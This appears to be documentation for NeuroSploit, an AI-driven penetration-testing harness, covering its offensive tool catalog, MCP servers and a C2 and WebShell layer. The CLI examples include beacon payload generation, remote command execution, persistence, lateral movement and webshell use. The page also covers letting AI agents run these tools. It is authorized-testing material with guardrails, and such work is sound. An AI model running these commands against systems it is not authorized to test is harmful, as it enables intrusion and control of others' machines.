# Toolbox, MCP tool servers, C2 & WebShells

These are **opt-in add-ons**. A normal engagement behaves exactly as before.

## Toolbox — 200+ real tools

NeuroSploit ships an embedded catalog (`neurosploit-rs/tools/toolbox.json`,
**225 entries**) so the model and the operator can run the right tool instead of
only `curl` or a hand-written Python script.

| Category | Examples |
|---|---|
| `recon` | subfinder, amass, gau, waybackurls, katana, dnsx, theHarvester |
| `web` | httpx, whatweb, wafw00f, nuclei, ffuf, feroxbuster, sqlmap, dalfox, jwt_tool, arjun |
| `network` | **nmap**, **rustscan**, masscan, naabu, smbmap, smbclient, snmpwalk, rpcclient |
| `ad` | netexec, enum4linux-ng, impacket (secretsdump/GetUserSPNs/psexec), bloodhound-python, kerbrute, certipy, responder, mitm6, evil-winrm |
| `cloud` / `container` | trivy, grype, syft, prowler, scoutsuite, checkov, kube-bench, kube-hunter, cloud_enum, s3scanner |
| `mobile` / `binary` | apktool, jadx, apkleaks, frida, objection, MobSF, Ghidra headless, radare2/rizin, binwalk, checksec |
| `exploit` / `creds` | metasploit, msfvenom, searchsploit, hashcat, john, hydra, medusa |
| `forensics` / `ai` | volatility3, foremost, exiftool, garak, promptfoo, pyrit |

### CLI

```bash
neurosploit tools list --json
neurosploit tools search kerberos
neurosploit tools info nmap
neurosploit tools check nmap --json          # installed + version (no scan)
neurosploit tools profiles --json            # recommended chain per mode

# run a tool (target is appended when the args do not contain one)
neurosploit tools run nmap --target 10.0.0.5 --args='-sV -p 22,80,443' --json
neurosploit tools run rustscan --target 10.0.0.5 --args='--ulimit 5000 -- -sV'
neurosploit tools run httpx --target https://app.example.com
neurosploit tools run netexec --target 10.0.0.10 --args='smb 10.0.0.10 --shares'

# explicit install only; add --sandbox to provision inside Kali
neurosploit tools install nmap
neurosploit tools run nmap --target 10.0.0.5 --provision --sandbox
```

The runner enforces engagement scope (when invoked from a run), operator
constraints ("no port scan", "passive only"), timeouts and a 256 KB output cap,
and appends every execution to `.neurosploit/toolbox/toolbox-audit.jsonl`.

### Agent integration

- `--tools` injects the toolbox doctrine into recon/exploit/chain prompts.
- `--agent-tools` additionally lets an **API-model** recon phase choose up to 6
  cataloged tools as JSON. The harness executes them through the same runner and
  appends the raw output to recon facts. Unknown tools, out-of-scope targets and
  constraint violations are rejected.
- Subscription agents (Claude Code / Codex / …) can already run shell commands;
  the doctrine teaches them the `neurosploit tools` verbs.
- Without these flags, nothing changes.

```bash
neurosploit run https://app --subscription --model anthropic:claude-opus-4-8 \
  --mcp --tools --agent-tools
```

## MCP tool servers

Curated templates live in the harness (`toolbox::mcp_catalog`):

| Server | Command | Notes |
|---|---|---|
| `nmap` | `npx -y gc-nmap-mcp` | `NMAP_PATH` is set automatically |
| `kali` | `kali-mcp` | install via `pipx install kali-mcp` or the Docker image |
| `playwright` | `npx -y @playwright/mcp@latest --headless --isolated` | JS-heavy targets |
| `burp` | HTTP `http://127.0.0.1:1337/v0.1` | adjust in `mcp.servers.json` |
| `rea` | `rea --mode binary` | mobile/native RE |
| `neurosploit` | `neurosploit mcp` | C2/WebShell + toolbox tools for any MCP client |

```bash
neurosploit tools mcp list
neurosploit tools mcp add nmap        # writes ./mcp.servers.json
neurosploit tools mcp test nmap
neurosploit tools mcp json kali

# or select per run (merged into .mcp.json):
neurosploit run https://app --subscription --mcp --mcp-server nmap --mcp-server kali \
  --model anthropic:claude-opus-4-8
```

NeuroSploit itself exposes MCP tools for this layer: `neurosploit_tool_list`,
`neurosploit_tool_info`, `neurosploit_tool_check`, `neurosploit_tool_run`,
`neurosploit_tool_mcp`.

## C2 & WebShell (authorized internal engagements)

The C2 layer is **disabled by default** and requires an authorization reference.

```bash
neurosploit c2 enable --authorization "SOW-2026-001" --persistence --lateral
neurosploit c2 listener create --name lab --bind-port 8443
neurosploit c2 listener start <listener-id>
neurosploit c2 payload beacon --listener <listener-id> --kind bash --json
neurosploit c2 session list
neurosploit c2 task exec --session <s-id> --command 'id' --wait --json
neurosploit c2 task persist --session <s-id> --method auto --wait --json
neurosploit c2 task lateral --session <s-id> --command 'nmap -sV 10.0.0.6' --wait --json
neurosploit c2 disable
```

WebShell manager:

```bash
neurosploit webshell add --url http://10.0.0.5/shell.php --password s3cret
neurosploit webshell test <ws-id>
neurosploit webshell exec --id <ws-id> --command 'id'
neurosploit webshell file --id <ws-id> --action list --path /var/www
```

Guardrails: loopback bind by default, private/loopback WebShell targets unless
allow-listed, persistence/lateral as separate opt-ins, 0600 state/payloads, and
an append-only audit log under `.neurosploit/c2/`.

## Web console

The console adds two views:

- **Toolbox** — browse/search the catalog, check versions, run tools, install
  explicitly, and manage MCP servers.
- **C2 & Shells** — enable C2 with an authorization reference, manage listeners,
  sessions, tasks, payloads and WebShell connections.

Relevant API endpoints are listed in [`web/API.md`](../web/API.md).
